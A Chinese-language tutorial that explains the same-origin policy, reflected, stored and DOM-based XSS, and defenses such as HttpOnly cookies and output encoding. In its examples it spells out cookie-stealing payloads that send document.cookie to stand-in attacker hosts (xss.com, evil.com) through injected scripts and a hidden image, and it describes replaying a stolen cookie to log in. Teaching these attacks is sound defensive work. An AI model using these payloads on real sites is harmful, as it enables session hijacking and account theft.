[[toc]]

####同源策略（前置知识）

#####定义
>同源策略（Sameoriginpolicy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。
同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，因此__拦截的是客户端发出的请求回来的数据，即请求发送了，服务器响应了，但是无法被浏览器接收.

#####本质
>a. 影响“源”的因素有：host（域名或者IP地址）、子域名、端口、协议
![](http://img.xiumi.us/xmi/ua/26J14/i/cf0780b9647ff7fe1d87c3e98216987a-sz_49287.png)
b.对浏览器来说，DOM、Cookie、XMLHttpRequest会受到同源策略的限制

#####举例说明
>a.一个浏览器的两个tab页中分别打开来百度和谷歌的页面
b.当浏览器的百度tab页执行一个脚本的时候会检查这个脚本是属于哪个页面的，即检查是否同源，只有和百度同源的脚本才会被执行
c.如果非同源，那么在请求数据时，浏览器会在控制台中报一个异常，提示拒绝访问

!!#ff0000 __不受同源策略的标签__!!
>a. &lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;等标签都!!#ff0000可以跨域加载资源，而不受同源策略的限制,而xss正是利用这一点进行攻击的!!
b.这些带"src"属性的标签每次加载时，浏览器会发起一次GET请求。通过src属性加载的资源，浏览器限制了javascript的权限，使其不能读、写返回的内容

***

####跨站脚本攻击（XSS）

#####定义
>英文全称：CrossSiteScript，XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击，本质
是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而产生了新的语义

#####分类

 !!#ff0000 1.反射型XSS!!
>__定义__
非持久化，一般需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面
__举例说明__
a.假设在某购物网站上搜商品，当搜不到商品时会出现
![](http://img.xiumi.us/xmi/ua/26J14/i/ab1fab1ecd26872d063809cd99f65ebb-sz_39866.png)
此时的URL是`https://category.vip.com/suggest.php?keyword=xss&amp;ff=235|12|1|1`
b.在搜索框输入` <script&gt;alert('xss')</script&gt;`
c.如果前端页面没有对搜索框的内容进行过滤，而是直接发送，这时，URL地址栏应该会显示
`https://category.vip.com/suggest.php?keyword=&lt;script&gt;alert('xss')&lt;/script&gt;&amp;ff=235|12|1|1`
从而alert出xss，但事实却是已经转码了的：
`https://category.vip.com/suggest.php?keyword=%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E&amp;ff=235|12|1|1`
d.假设前端页面没有进行处理，那么攻击者就可以通过构造来获取用户的cookie的地址，来诱使用户来访问这个地址，比如说
`https://category.vip.com/suggest.php?keyword=&lt;script&gt;document.location='http://xss.com/get?cookie='+document.cookie&lt;/script&gt;&amp;ff=235|12|1|1`

***

 !!#ff0000 2.存储型XSS!!

>__定义__
存储型XSS，持久化，代码是存储在服务器中的
__举例说明：__
a.在个人信息或发表文章等地方，加入代码
b.如果没有过滤或过滤不严，那么这些代码将储存到服务器中
c.用户访问该页面的时候触发代码执行

 !!#ff0000 3.DOM Based XSS!!
>__定义__
通过修改页面的DOM节点形成的XSS。
__举例说明__
a.点击write会执行的代码
![](http://img.xiumi.us/xmi/ua/26J14/i/0d48cbf4b0e67957801596a1d22dfc6c-sz_25620.png)
b.在输入框中输入内容后点击write
![](http://img.xiumi.us/xmi/ua/26J14/i/950c3264b0d5ec06ec0d800e4fb03fc9-sz_50957.png)
c.此时再点击 /textLink/ (a链接)
![](http://img.xiumi.us/xmi/ua/26J14/i/d32eb78706e158169dbe443cbbae67a4-sz_48709.png)
__原理__
首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符"//"注释掉第二个单引号。点击此链接，脚本将被执行

#####XSSPayload攻击

>__定义__
XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为XSSPayload。实际上就是Javascript脚本（或者Flash或其他富客户端的脚本），所以XSSPayload能够做到任何javascript脚本能实现的功能
__原理__
一般一个网站为了防止用户无意间关闭页面，重新打开需要重新输入账号密码繁杂的情况下，一般都会把登录信息（登录凭证）加密存储在CooKie中，并且设置一个超时时间，在此时间段内，用户利用自己账号信息随意进出该网站。如果该网站遭到XSSPayload，黑客盗取了该用户的Cookie信息，往往意味着该用户的登录凭证丢失了，换句话说，攻击者不需要知道该用户的账号密码，直接利用盗取的Cookie模拟凭证，直接登录到该用户的账户。
__举例说明__
a.攻击者先在一个社区发表一篇文章
![](http://img.xiumi.us/xmi/ua/26J14/i/b6a3ef18d4edd35dd005ed2b20f2a849-sz_38617.png?x-oss-process=image/resize,w_1080/auto-orient,1/crop,x_0,y_67,w_899,h_260)
b.点击加载一个远程脚本`http://www.a.com/test.htm?abc="><script src=http://www.evil.com/evil.js></script>`
c.真正的XSSPayload写在这个远程脚本中，避免直接在URL的参数里写入大量的Javascript代码。
在evil.js中，通过如下代码窃取cookie
`var img=document.createElement("img");`
`img.src="http://www.evil.com/log?"+escape(document.cookie);`
`document.body.appendChild(img);`
d.以上代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器中,
e.`http://www.evil.com/log`并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录`127.0.0.1--[119/Jul/2010:11:30:42+0800]"GET/log?sessionID%3Dsadasdasdascas%3B%20UUID%3D1123214HTTP/1.1"404288`
f.模拟CooKie登陆,f12打开控制台，模拟输入对应的cookie
![](http://img.xiumi.us/xmi/ua/26J14/i/e24b74af45ea93c6d8e2e9993b0f446b-sz_37217.png)__

####XSS的防御
1.HttpOnly

>浏览器禁止页面的Javascript访问带有HttpOnly属性的cookie。（实质解决的是：XSS后的cookie劫持攻击）如今已成为一种“标准”的做法
不同语言给cookie添加HttpOnly的方式不同，比如
JavaEE: `response.setHeader("Set-Cookie","cookiename=value";Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");`
PHP4: `header("Set-Cookie:hidden=value;httpOnly");`
PHP5: `setcookie("abc","test",NULL,NULL,NULL,NULL,TRUE);//ture为HttpOnly属性`

2.输入检查（XSSFilter）
>让一些基于特殊字符的攻击失效。（常见的Web漏洞如XSS、SQLInjection等，都要求攻击者构造一些特殊字符）
输入检查的逻辑，必须放在服务器端代码中实现。目前Web开发的普遍做法，是同时在客户端Javascript中和服务端代码中实现相同的输入检查。客户端的输入检查可以阻挡大部分误操作的正常用户，节约服务器资源。

3.输出检查
>在变量输出到HTML页面时，使用编码或转义的方式来防御XSS攻击
a.针对HTML代码的编码方式：HtmlEncode
b.PHP：htmlentities()和htmlspecialchars()两个函数
c.Javascript：JavascriptEncode（需要使用“\”对特殊字符进行转义，同时要求输出的变量必须在引号内部）
d.在URL的path（路径）或者search（参数）中输出，使URLEncode
[具体实施点击此处](https://www.cnblogs.com/lovesong/p/5211667.html)

####总结
XSS漏洞虽然复杂，但是却是可以彻底解决的。在设计解决方案时，应该针对不同场景理解XSS攻击的原理，使用不同的方法。
